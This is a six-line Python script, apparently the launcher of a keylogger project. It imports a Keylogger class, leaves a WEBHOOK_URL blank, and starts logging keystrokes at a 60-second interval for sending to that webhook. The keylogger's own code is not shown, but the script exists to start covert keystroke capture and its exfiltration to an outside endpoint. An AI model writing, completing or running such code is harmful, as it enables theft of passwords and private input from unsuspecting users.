from keylogger import Keylogger

WEBHOOK_URL = ""

my_keylogger = Keylogger(interval=60, webhook_url=WEBHOOK_URL)
my_keylogger.start()
